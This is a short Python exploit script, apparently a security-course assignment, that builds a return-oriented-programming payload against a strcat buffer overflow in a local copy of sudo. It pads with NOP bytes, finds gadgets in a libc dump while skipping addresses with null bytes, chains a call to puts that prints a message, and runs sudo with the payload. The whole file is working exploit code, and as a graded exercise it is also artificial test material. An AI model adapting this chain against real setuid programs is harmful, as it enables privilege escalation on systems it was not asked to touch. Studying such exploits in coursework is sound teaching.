import os, sys, struct

import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.PUTS` to get the address of the `puts` function.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.
    offset = 66
    nop = '\x90'
    pop_ebp = search.find("pop ebp", condition=has_null_byte)
    add_esp_4 = search.find("add esp, 4", condition=has_null_byte)
    pop_esp = search.find("pop esp", condition=has_null_byte)
    
    return offset * nop + struct.pack("<IIIIIII", pop_ebp, addresses.PUTS, addresses.PUTS, add_esp_4, addresses.ADDRESS_OF_STRING, pop_esp, addresses.ADDRESS_OF_LOOP) + get_string(308216340)


def has_null_byte(address):
    # Checks if the address has a null byte
    # This will be used as a condition to the GadgetSearch because this is a problem since the vulnerability is strcat and we can not allow a null byte.
    mask = 0x000000ff
    if (address & mask) == 0:
        return False
    if (address & (mask << 8)) == 0:
        return False
    if (address & (mask << 16)) == 0:
        return False
    if (address & (mask << 24)) == 0:
        return False

    return True


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
